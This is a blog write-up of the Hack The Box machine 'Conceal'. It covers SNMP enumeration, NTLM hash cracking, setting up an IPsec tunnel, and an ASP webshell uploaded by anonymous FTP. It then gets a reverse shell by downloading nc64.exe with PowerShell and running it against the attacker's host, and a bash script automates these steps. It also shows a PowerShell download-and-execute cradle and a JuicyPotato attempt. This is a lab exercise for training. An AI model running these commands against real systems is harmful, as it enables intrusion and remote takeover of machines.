<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.7.32">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2021-03-24">
<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">

<title>Conceal - Hack The Box – Exploit.se</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed quarto-light">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../assets/images/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../writeups.html"> 
<span class="menu-text">Writeups</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Conceal - Hack The Box</h1>
                  <div>
        <div class="description">
          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">March 24, 2021</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
        
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<pre><code>
   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. Normal nmap scans finds nothing, even flag -p- doesn't find anything. Instead we go for UDP;

[root:/git/htb/conceal]# nmap -sU -sV --version-intensity 0 -F -n 10.10.10.116
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
500/udp open  isakmp?
Service Info: Host: Conceal


2. With SNMP found, we can try to enumerate by guessing the community string is set to 'public', using snmp-check.

[root:/git/htb/conceal]# snmp-check 10.10.10.116 -p 161 -c public                                                                 (master✱)
  snmp-check v1.9 - SNMP enumerator

  [+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'
    Host IP address               : 10.10.10.116
    Hostname                      : Conceal
    Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
    Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
    Location                      : -
    Uptime snmp                   : 02:56:40.59
    Uptime system                 : 02:56:27.05
    System date                   : 2021-3-23 12:37:35.9
    Domain                        : WORKGROUP

  [*] User accounts:
    Guest
    Destitute
    Administrator
    DefaultAccount

  [*] TCP connections and listening ports:
    Local address         Local port            Remote address        Remote port           State
    0.0.0.0               21                    0.0.0.0               0                     listen
    0.0.0.0               80                    0.0.0.0               0                     listen
    0.0.0.0               135                   0.0.0.0               0                     listen
    0.0.0.0               445                   0.0.0.0               0                     listen
    0.0.0.0               49664                 0.0.0.0               0                     listen
    0.0.0.0               49665                 0.0.0.0               0                     listen
    0.0.0.0               49666                 0.0.0.0               0                     listen
    0.0.0.0               49667                 0.0.0.0               0                     listen
    0.0.0.0               49668                 0.0.0.0               0                     listen
    0.0.0.0               49669                 0.0.0.0               0                     listen
    0.0.0.0               49670                 0.0.0.0               0                     listen
    10.10.10.116          139                   0.0.0.0               0                     listen

  [*] Listening UDP ports:
    Local address         Local port
    0.0.0.0               123
    0.0.0.0               161
    0.0.0.0               500
    0.0.0.0               4500
    0.0.0.0               5050
    0.0.0.0               5353
    0.0.0.0               5355
    0.0.0.0               62345
    10.10.10.116          137
    10.10.10.116          138
    10.10.10.116          1900
    10.10.10.116          50998
    127.0.0.1             1900
    127.0.0.1             50999

  [*] Processes:
    Id                    Status                Name                  Path                  Parameters
    1                     running               System Idle Process
    4                     running               System
    60                    running               svchost.exe           C:\Windows\System32\  -k NetworkService
    68                    running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
    288                   running               smss.exe
    328                   running               svchost.exe           C:\Windows\system32\  -k LocalService
    380                   running               csrss.exe
    464                   running               wininit.exe
    472                   running               csrss.exe
    528                   running               winlogon.exe
    608                   running               services.exe
    616                   running               lsass.exe             C:\Windows\system32\
    668                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
    704                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch
    732                   running               fontdrvhost.exe
    736                   running               fontdrvhost.exe
    828                   running               svchost.exe           C:\Windows\system32\  -k RPCSS
    920                   running               dwm.exe
    944                   running               svchost.exe           C:\Windows\system32\  -k netsvcs
    980                   running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1116                  running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\
    1212                  running               Memory Compression
    1348                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1420                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1436                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
    1504                  running               spoolsv.exe           C:\Windows\System32\
    1672                  running               svchost.exe           C:\Windows\system32\  -k appmodel
    1688                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa3a9a055 /state1:0x41c64e6d
    1700                  running               svchost.exe           C:\Windows\system32\  -k apphost
    1720                  running               svchost.exe           C:\Windows\System32\  -k utcsvc
    1736                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc
    1816                  running               SecurityHealthService.exe
    1828                  running               snmp.exe              C:\Windows\System32\
    1892                  running               svchost.exe           C:\Windows\system32\  -k iissvcs
    1928                  running               MsMpEng.exe
    1936                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\
    1952                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\
    2000                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
    2628                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
    2768                  running               SearchIndexer.exe     C:\Windows\system32\  /Embedding
    2896                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\
    3036                  running               dllhost.exe           C:\Windows\system32\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
    3204                  running               msdtc.exe             C:\Windows\System32\
    3528                  running               NisSrv.exe
    3696                  running               svchost.exe           C:\Windows\system32\  -k LocalSystemNetworkRestricted
    4076                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceAndNoImpersonation

We get a lot of interesting data;
- IKE VPN PSK: 9C8B1A372B1878851BE2C097031B6E43 (Dudecake1!)
- Usernames; Destitute, Administrator
- A lot of listening TCP- and UDP-ports.


3. The hash looks like md5, but trying to crack it with hashcat and wordlist rockyou.txt gives nothing.
Using hash-identifier we get the option of 'NTLM', and sure enough trying that gives us a password.

[root:/git/htb/conceal]# hash-identifier
  --- snip ---
   HASH: 9C8B1A372B1878851BE2C097031B6E43

  Possible Hashs:
  [+] MD5
  [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

  Least Possible Hashs:
  [+] RAdmin v2.x
  [+] NTLM


[root:/git/htb/conceal]# hashcat -a0 -m1000 '9C8B1A372B1878851BE2C097031B6E43' /usr/share/wordlists/rockyou.txt
  --- snip ---
  9c8b1a372b1878851be2c097031b6e43:Dudecake1!

Using ike-scan we can verify if they're running in aggressive or main mode. If aggressive mode, we can easily
brute force the group ID, and later a password hash to gain access.

Aggressive test:
[root:/git/htb/conceal]# ike-scan -M -A 10.10.10.116 --id=test --sport=5001                                                       (master✱)
  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

  Ending ike-scan 1.9.4: 1 hosts scanned in 2.438 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify

Main test:
[root:/git/htb/conceal]# ike-scan -M 10.10.10.116 --sport=5001                                                          (master✱)
  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
  10.10.10.116  Main Mode Handshake returned
    HDR=(CKY-R=f2741f0361c9dbfa)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
    VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
    VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
    VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
    VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
    VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
    VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

  Ending ike-scan 1.9.4: 1 hosts scanned in 0.064 seconds (15.72 hosts/sec).  1 returned handshake; 0 returned notify

However they are running main mode, making it all that much harder.


4. With the information we have gathered, configure strongswan to setup our IPSec connection.

Edit '/etc/ipsec.secrets' and add the PSK at the bottom;
[root:/git/htb/conceal]# cat /etc/ipsec.secrets                                                                                   (master✱)
  --- snip ---
  10.10.10.116 : PSK "Dudecake1!"

Setup a new connection in '/etc/ipsec.conf';
[root:/git/htb/conceal]# cat /etc/ipsec.conf                                                                                      (master✱)
  --- snip ---
  conn Conceal
    type=transport
    auto=start
    keyexchange=ikev1
    authby=psk
    right=10.10.10.116
    ike=3des-sha1-modp1024
    esp=3des-sha1
    rightprotoport=tcp
    leftprotoport=tcp

[root:/git/htb/conceal]# ipsec start                                                                                              (master✱)
  Starting strongSwan 5.9.1 IPsec [starter]...
[root:/git/htb/conceal]# ipsec status                                                                                             (master✱)
  Security Associations (1 up, 0 connecting):
       Conceal[1]: ESTABLISHED 4 seconds ago, 10.10.14.11[10.10.14.11]...10.10.10.116[10.10.10.116]
       Conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: cddc16ac_i 19a4e0d0_o
       Conceal{1}:   10.10.14.11/32 === 10.10.10.116/32[tcp]

NOTE: Troubleshooting can be done by adding the --nofork flag, ex. 'ipsec start --nofork'


5. Now when connected, we can scan the device and get a satisfactory result. We found all open TCP ports earlier using
smnp-check, scan them again with nmap (flag -sT needed else everything shows as filtered).

[root:/opt/ikeforce]# nmap -sT -sVC 10.10.10.116 -p21,80,135,445,49664,49665,49666,49667,49668,49669,49670,139                     (master)
  PORT      STATE SERVICE       VERSION
  21/tcp    open  ftp           Microsoft ftpd
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | ftp-syst:
  |_  SYST: Windows_NT
  80/tcp    open  http          Microsoft IIS httpd 10.0
  | http-methods:
  |_  Potentially risky methods: TRACE
  |_http-server-header: Microsoft-IIS/10.0
  |_http-title: IIS Windows
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds?
  49664/tcp open  msrpc         Microsoft Windows RPC
  49665/tcp open  msrpc         Microsoft Windows RPC
  49666/tcp open  msrpc         Microsoft Windows RPC
  49667/tcp open  msrpc         Microsoft Windows RPC
  49668/tcp open  msrpc         Microsoft Windows RPC
  49669/tcp open  msrpc         Microsoft Windows RPC
  49670/tcp open  msrpc         Microsoft Windows RPC
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_clock-skew: 6m23s
  | smb2-security-mode:
  |   2.02:
  |_    Message signing enabled but not required
  | smb2-time:
  |   date: 2021-03-23T15:23:09
  |_  start_date: 2021-03-23T09:41:08

DIRB:
  ---- Scanning URL: http://10.10.10.116/ ----
  ==&gt; DIRECTORY: http://10.10.10.116/upload/


6. We got anonymous login to the FTP server, and can put files on the share. From dirb we found a 'upload' directory,
meaning we can probably upload a shell on the FTP-server, and trigger it through the URL.

Seems like we can upload most files, however file bigger then 1100 seem to get stuck in upload.
None of .aspx, .php, .py, .war, .exe, .jsp seem to work. I went with a minimal (size 1099) .asp webshell that worked.

From the webshell we can grab user.txt (called proof.txt in this box)

ftp&gt; open 10.10.10.116
  Connected to 10.10.10.116.
  220 Microsoft FTP Service
  Name (10.10.10.116:root): anonymous
  331 Anonymous access allowed, send identity (e-mail name) as password.
  Password:
  230 User logged in.
  Remote system type is Windows_NT.
ftp&gt; put webshell.asp

Browse: http://10.10.10.116/upload/webshell.asp

Enter: type C:\Users\Destitute\Desktop\proof.txt
or
URL: http://10.10.10.116/upload/webshell.asp?cmd=type+C%3A%5CUsers%5CDestitute%5CDesktop%5Cproof.txt

The server's local address:
10.10.10.116 6E9FDFE0DCB66E700FB9CB824AE5A6FF


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. To get a reverse shell has been very very annoying. I tried everything from one-liners to trigger powershell scripts
over a python3 hosted http.server, trigger executables over smb and more - but all failed, even though the victim
fetched the vulnerable file/scripts.

The solution was primal:
  a. Setup local python3 http.server in a directory containing nc64.exe
  b. Setup your nc listener
  c. Upload a webshell through the anonymous FTP
  d. Quickly create C:\tmp before webshell is deleted
  e. Quickly upload nc64.exe to C:\tmp
  f. Even faster execute a reverse connection from C:\tmp\nc64.exe before BOTH webshell and nc64.exe is deleted
  g. Grab shell and profit

WEBSHELL: mkdir C:\tmp

[root:/opt/shells/asp]# python3 -m http.server 8080
  Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
  10.10.10.116 - - [24/Mar/2021 12:23:48] "GET /nc64.exe HTTP/1.1" 200 -

WEBSHELL: powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/nc64.exe" -OutFile "C:\tmp\nc64.exe"
WEBSHELL: powershell -c "C:\tmp\nc64.exe 10.10.14.11 4488 -c cmd"

[root:/git/htb/conceal]# nc -lvnp 4488                                                                                            (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.11] from (UNKNOWN) [10.10.10.116] 49705
  Microsoft Windows [Version 10.0.15063]
  (c) 2017 Microsoft Corporation. All rights reserved.

  C:\Windows\SysWOW64\inetsrv&gt;


This whole process can also be automated if one would want to make a script. For this I made a real quick and dirty
bash script, curl-rev.sh, as a poc.

[root:/git/htb/conceal]# cat curl-rev.sh                                                                                          (master✱)
  #!/bin/bash

  ### IMPORTANT! ###
  # Before you run the script, make sure to setup:
  # python -m http.server 8080 (in a folder where nc64.exe exists)
  # rlwrap nc -lvnp 4488

  # Upload Webshell
  curl --user anonymous:anonymous --upload-file /opt/shells/asp/webshell.asp ftp://conceal.htb/

  # Upload nc64.exe and executes reverse:
  # mkdir C:\tmp
  # powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/nc64.exe" -OutFile "C:\tmp\nc64.exe"
  # C:\tmp\nc64.exe 10.10.14.11 4488 -e cmd
  curl http://conceal.htb/upload/webshell.asp\?cmd\=mkdir%20C%3A%5Ctmp
  curl http://conceal.htb/upload/webshell.asp\?cmd\=powershell%20Invoke-WebRequest%20-Uri%20%22http%3A%2F%2F10.10.14.11%3A8080%2Fnc64.exe%22%20-OutFile%20%22C%3A%5Ctmp%5Cnc64.exe%22
  sleep 1
  curl http://conceal.htb/upload/webshell.asp\?cmd\=C%3A%5Ctmp%5Cnc64.exe%2010.10.14.11%204488%20-e%20cmd
  echo "done!"


2. Enumerate the box! Look a groups, privs, and see if there are any obviously suspicious files.

C:\tmp&gt;whoami /all
  --- snip ---
  Everyone                             Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
  BUILTIN\Users                        Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                                                          Mandatory group, Enabled by default, Enabled group
  CONSOLE LOGON                        Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\Local account           Well-known group S-1-5-113                                                                                        Mandatory group, Enabled by default, Enabled group
  BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                                                     Mandatory group, Enabled by default, Enabled group
  LOCAL                                Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
  IIS APPPOOL\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                    Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                                                      Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541    Mandatory group, Enabled by default, Enabled group
  Mandatory Label\High Mandatory Level Label            S-1-16-12288

  --- snip ---
  Privilege Name                Description                               State
  ============================= ========================================= ========
  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
  SeShutdownPrivilege           Shut down the system                      Disabled
  SeAuditPrivilege              Generate security audits                  Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
  SeUndockPrivilege             Remove computer from docking station      Disabled
  SeImpersonatePrivilege        Impersonate a client after authentication Enabled
  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
  SeTimeZonePrivilege           Change the time zone                      Disabled

Groups looks pretty normal, nothing really going on there.
We can see from the privs that we have 'SeImpersonatePrivilege', maybe we can use JuicyPotato?


3. Trying to execute JuicyPotato unfortunately locally and remotely triggers the AV;
C:\Users\Destitute\Documents&gt; powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/JuicyPotato.exe" -OutFile jp.exe
C:\Users\Destitute\Documents&gt; powershell -c "C:\Users\Destitute\Documents\jp.exe -l 1444 -p c:\tmp\nc64.exe -a "10.10.14.11 4499 -e cmd" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
  --- snip ---
  Program 'jp.exe' failed to run: Operation did not complete successfully because the file contains a virus or
  potentially unwanted software

We can't even setup a new reverse Powershell shell with Nishang's Invoke-PowerShellTcp without the AV complaining;
C:\Users\Destitute\Documents&gt; powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/Invoke-PowerShellTcp.ps1')
  --- snip ---
  This script contains malicious content and has been blocked by your antivirus software.


Seems like we need to look for another privesc.


4. Grab systeminfo and throw it to windows-exploit-suggester.

[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --update                                                        (master✱)
[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --database 2021-03-25-mssb.xls --systeminfo systeminfo.txt
  [*] initiating winsploit version 3.3...
  [*] database file detected as xls or xlsx based on extension
  [*] attempting to read from the systeminfo input file
  [+] systeminfo input file read successfully (ascii)
  [*] querying database file for potential vulnerabilities
  [*] comparing the 0 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
  [*] there are now 160 remaining vulns
  [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
  [+] windows version identified as 'Windows 10 64-bit'
  [*]
  [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
  [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
  [*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
  [*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
  [*]
  [E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
  [*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
  [*]   https://github.com/theori-io/chakra-2016-11
  [*]
  [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
  [*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
  [*]
  [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
  [*]   https://github.com/foxglovesec/RottenPotato
  [*]   https://github.com/Kevin-Robertson/Tater
  [*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
  [*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
  [*]
  [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
  [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
  [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
  [*]
  [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
  [*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
  [*]
  [E] MS16-056: Security Update for Windows Journal (3156761) - Critical
  [*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
  [*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
  [*]
  [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
  [*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
  [*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
  [*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
  [*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
  [*]
  [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
  [*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
  [*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
  [*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
  [*]
  [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
  [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
  [*]
  [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
  [*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
  [*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
  [*]
  [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
  [*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
  [*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
  [*]
  [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
  [*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
  [*]
  [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
